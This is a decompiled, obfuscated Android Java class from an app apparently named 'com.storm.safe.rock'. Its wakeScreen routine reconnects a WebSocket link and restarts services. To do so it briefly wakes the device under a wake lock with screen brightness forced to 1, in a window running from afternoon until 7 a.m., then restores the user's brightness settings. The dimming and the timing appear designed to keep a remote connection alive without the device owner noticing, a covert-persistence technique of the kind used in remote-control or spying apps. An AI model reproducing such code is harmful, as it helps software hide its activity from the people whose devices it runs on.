package p000;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import com.storm.safe.rock.receiver.hhymfsyujsj;
import com.storm.safe.rock.service.modules.C0323a8;
import java.util.Calendar;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class mj1 {
    public /* synthetic */ mj1(AbstractC1120qr abstractC1120qr) {
        this();
    }

    private final int getBatteryLevel(Context context) {
        try {
            Object systemService = context.getSystemService("batterymanager");
            BatteryManager batteryManager = systemService instanceof BatteryManager ? (BatteryManager) systemService : null;
            if (batteryManager != null) {
                return batteryManager.getIntProperty(4);
            }
        } catch (Exception unused) {
        }
        return -1;
    }

    public static /* synthetic */ boolean wakeScreen$default(mj1 mj1Var, Context context, boolean z, int i, Object obj) {
        if ((i & 2) != 0) {
            z = true;
        }
        return mj1Var.wakeScreen(context, z);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void wakeScreen$lambda$2(Context context, int i, int i2) {
        t60.m214695b6(context, "$context");
        try {
            if (Settings.System.canWrite(context)) {
                Settings.System.putInt(context.getContentResolver(), "screen_brightness_mode", i);
                Settings.System.putInt(context.getContentResolver(), "screen_brightness", i2);
            }
        } catch (Exception unused) {
        }
    }

    public final nj1 getInstance(Context context) {
        nj1 nj1Var;
        t60.m214695b6(context, "context");
        nj1 nj1Var2 = nj1.f58635a5;
        if (nj1Var2 != null) {
            return nj1Var2;
        }
        synchronized (this) {
            nj1Var = nj1.f58635a5;
            if (nj1Var == null) {
                Context applicationContext = context.getApplicationContext();
                t60.m214694b5(applicationContext, "context.applicationContext");
                nj1Var = new nj1(applicationContext);
                nj1.f58635a5 = nj1Var;
            }
        }
        return nj1Var;
    }

    public final boolean isInAllowedTimeRange(int i, int i2) {
        int i3 = Calendar.getInstance().get(11);
        return i <= i2 ? i <= i3 && i3 < i2 : i3 >= i || i3 < i2;
    }

    public final boolean wakeScreen(Context context, boolean z) {
        int i;
        t60.m214695b6(context, "context");
        int i2 = 0;
        if (z) {
            try {
                mj1 mj1Var = nj1.f58634a4;
                if (!isInAllowedTimeRange(14, 7)) {
                    return true;
                }
            } catch (Exception e) {
                t60.m214705c6("dhkgxdffvdxr", "❌ 点亮屏幕失败", e);
                return false;
            }
        }
        int batteryLevel = getBatteryLevel(context);
        if (1 <= batteryLevel && batteryLevel < 15) {
            t60.m214702c3("dhkgxdffvdxr", "\u1faab 电量 " + batteryLevel + "% < 15%，跳过唤醒");
            return true;
        }
        lj0 lj0Var = C0323a8.f53097e0;
        C0323a8 lj0Var2 = lj0Var.getInstance();
        if (lj0Var2 != null ? lj0Var2.f53103a3 : false) {
            t60.m214702c3("dhkgxdffvdxr", "✅ WS 已连接，无需唤醒");
            return true;
        }
        try {
            C0323a8 lj0Var3 = lj0Var.getInstance();
            if (lj0Var3 != null) {
                lj0Var3.m211643a8();
            }
        } catch (Exception e2) {
            t60.m214726f4("dhkgxdffvdxr", "⚠️ 触发重连失败: " + e2.getMessage());
        }
        try {
            hhymfsyujsj.f52289a0.startServices(context);
        } catch (Exception e3) {
            t60.m214726f4("dhkgxdffvdxr", "⚠️ 启动服务失败: " + e3.getMessage());
        }
        Object systemService = context.getSystemService("power");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
        PowerManager powerManager = (PowerManager) systemService;
        boolean zIsInteractive = powerManager.isInteractive();
        C0323a8 lj0Var4 = C0323a8.f53097e0.getInstance();
        boolean z2 = lj0Var4 != null ? lj0Var4.f53103a3 : false;
        t60.m214714d6("dhkgxdffvdxr", "📱 唤醒触发 — WS断开, 屏幕=" + (zIsInteractive ? "亮" : "灭") + ", HTTP=" + (z2 ? "在线" : "离线") + ", 电量=" + batteryLevel + "%");
        int i3 = 128;
        try {
            i3 = Settings.System.getInt(context.getContentResolver(), "screen_brightness", 128);
        } catch (Exception unused) {
        }
        try {
            i = Settings.System.getInt(context.getContentResolver(), "screen_brightness_mode", 0);
        } catch (Exception unused2) {
            i = 0;
        }
        try {
            if (Settings.System.canWrite(context)) {
                Settings.System.putInt(context.getContentResolver(), "screen_brightness_mode", 0);
                Settings.System.putInt(context.getContentResolver(), "screen_brightness", 1);
            }
        } catch (Exception unused3) {
        }
        powerManager.newWakeLock(268435462, "dhkgxdffvdxr:WakeScreen").acquire(30000L);
        t60.m214714d6("dhkgxdffvdxr", "🔆 屏幕保持亮 30s（DIM+brightness=1），等待网络恢复+WS重连");
        new Handler(Looper.getMainLooper()).postDelayed(new lj1(context, i, i3, i2), 30000L);
        return true;
    }

    private mj1() {
    }
}
